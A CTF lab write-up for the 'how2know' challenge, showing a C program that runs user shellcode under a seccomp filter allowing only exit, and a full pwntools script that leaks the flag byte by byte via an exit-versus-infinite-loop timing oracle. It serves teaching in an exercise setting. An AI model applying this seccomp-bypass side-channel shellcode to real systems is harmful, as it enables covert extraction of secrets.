# Simple PWN - 0x13(Lab - `how2know`)
###### tags: `CTF` `PWN` `eductf`

challenge: `nc edu-ctf.zoolab.org 10002`
Environment Version: 22.04

## Original Code
:::spoiler code
```cpp!=
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <stdlib.h>

static char flag[0x30];

int main()
{
    void *addr;
    int fd;
    scmp_filter_ctx ctx;

    addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ((unsigned long)addr == -1)
        perror("mmap"), exit(1);
    
    fd = open("/home/chal/flag", O_RDONLY);
    if (fd == -1)
        perror("open"), exit(1);
    read(fd, flag, 0x30);
    close(fd);

    write(1, "talk is cheap, show me the code\n", 33);
    read(0, addr, 0x1000);

    ctx = seccomp_init(SCMP_ACT_KILL);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);

    ((void(*)())addr)();

    return 0;
}
```
:::
```make!
gcc -o chal how2know.c -lseccomp
```
```bash!
$ checksec chal
[*] '/home/sbk6401/NTUCS/PWN/Lab/how2know/share/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ seccomp-tools dump ./chal
talk is cheap, show me the code
123
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0007
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```
* Note that, if you want to use `seccomp-tools`, you should modify `/home/chal/flag` to `./flag`
* It just allow `exit` function
### Description & Preliminary idea
* At line 16, it create a writable, readable and executable space with size `0x1000`
* And it read the flag to global variable without buffer overflow
* Then it allow us to write something to `addr` memory space
* In addition, turn on `seccomp` rules to protect itself
* <font color="FF0000">**MOST IMPORTANT AT LINE 35**</font>: it'll call `addr` as function
* So, the preliminary idea is to put some instructions to `addr` and it'll execute at line 35
## Exploit - brute force + assembly instruction
1. Observe register and try to leak flag info.
    ```bash!
    $ gdb chal
    >pwndbg b main
    >pwndbg r
    >pwndbg b *main+337
    >pwndbg c
    ```
    ![](https://imgur.com/avi7T2U.png)
    We can see that in `$r13` store `0x555555555289 (main) ◂— endbr64` and we can aware of the truly address of variable `flag` by using vmmap.
    ```bash
    pwndbg> vmmap
    pwndbg> x/100s 0x555555558000
    ...
    0x555555558040 <flag>:  "FLAG{test_1235s456fasdjknisjsdfkl45641233f1234}\n"
    ...
    ```
    ![](https://imgur.com/qQcl5gY.png)
    So, we can knew the distance of these two address is <font color="FF0000">**`0x2db7`**</font>
    ```python
    >>> hex(0x555555558040-0x555555555289)
    '0x2db7'
    ```
    
    exploit: move the first 8 bytes to `$rax`
    ```assembly!
    mov r10, r13
    add r10, 0x2db7
    mov rax, [r10]
    ```
    ![](https://imgur.com/OxBoyoK.png)
    * Note that, if you'd like to move next 8 bytes to `$rax`, rewrite `[r10]` to `[r10+0x8]`
2. Compare the single char by brute force
If the result of comparison is correct, the system will call `sys_exit` with `error_code=0`, otherwise, access to infinity loop.
We start from `0x20` on ascii table and end at `0x80`
Especially, when the comparison is correct, we have to shift `$rax` with 8 bits and start to compare next single char
    ```assembly!
        mov cl, ''' + str(guess) + '''
        shr rax, ''' + str(8*shift_count) + '''
    Compare:
        cmp al, cl
        je the_same
    infinity1:
        jmp infinity1
    the_same:
        mov rax, 0x3c
        mov rdi, 0
        syscall
    ```
    ![](https://upload.wikimedia.org/wikipedia/commons/1/1b/ASCII-Table-wide.svg)

3. Send the shellcode to `addr` global variable
The trickiest things is you must add `\x00` at the end of received  strings and the reason is for the control flow next.
    ```python!
    r.sendafter(b"code\n\x00", shellcode)
    ```
4. How to know the single char in pwntool side?
If compare correct, the program will exit directly and pwntools will trigger timeout function and do the exception, at the same time, we can clearly aware of the what is the current single char is, otherwise, the guess will increase and do the next comparison.
    ```python!
    try :
        # If compare not correct, guess++ and access to infinity loop
        r.recv(timeout=0.2)
        print('not the same')
        guess += 1
    except:
        # If compare correct, pwntool will break out
        print('the same')
        break
    r.close()
    ```
5. Repeat
`shift_count` can not over 7 is because the biggest size that `$rax` can store is 8 bytes
    ```python!
    flag = ''
    shift_count = 0
    while shift_count < 8:
        guess = 0x20
        while guess < 0x80 :
            {create shellcode}
            {send shellcode}

            try:
                ...
            except:
                ...
            r.close()
        shift_count += 1
        flag += chr(guess)
    print(flag)
    r.interactive()
    ```



* Whole exploit
    :::spoiler code
    ```python!=
    from pwn import *

    # r = process('./chal')
    context.arch = 'amd64'

    flag = ''
    shift_count = 0
    while shift_count < 8:
        guess = 0x20
        while guess < 0x80 :
            # r = process('./chal')
            r = remote('edu-ctf.zoolab.org',10002)
            shellcode = asm('''
                mov r10, r13
                add r10, 0x2db7
                mov rax, [r10]
                mov cl, ''' + str(guess) + '''
                shr rax, ''' + str(8*shift_count) + '''
            Compare:
                cmp al, cl
                je the_same
            infinity1:
                jmp infinity1
            the_same:
                mov rax, 0x3c
                mov rdi, 0
                syscall
            ''')
            # raw_input()
            r.sendafter(b"code\n\x00", shellcode)
            try :
                # If compare not correct, guess++ and access to infinity loop
                r.recv(timeout=0.2)
                print('not the same')
                guess += 1
            except:
                # If compare correct, pwntool will break out
                print('the same')
                break
            # raw_input()
            r.close()

        shift_count += 1
        flag += chr(guess)
    print(flag)
    r.interactive()
    ```
    :::
* <font color="FF0000">Note that</font>: I create 6 multi-threads to execute the exploit program simultaneously with a little bit difference
1st thread: `mov rax, [r10]`            output:FLAG{pia
2nd thread: `mov rax, [r10+0x8]`        output:no_d113f
3rd thread: `mov rax, [r10+0x10]`        output:1c3f9ed8
4th thread: `mov rax, [r10+0x18]`        output:019288f4
5th thread: `mov rax, [r10+0x20]`        output:e8ddecfb
6th thread: `mov rax, [r10+0x28]`        output:8ec}
FLAG{piano_d113f1c3f9ed8019288f4e8ddecfb8ec}
## Reference
[linux 中mmap的用法](https://www.cnblogs.com/bittorrent/p/3267736.html)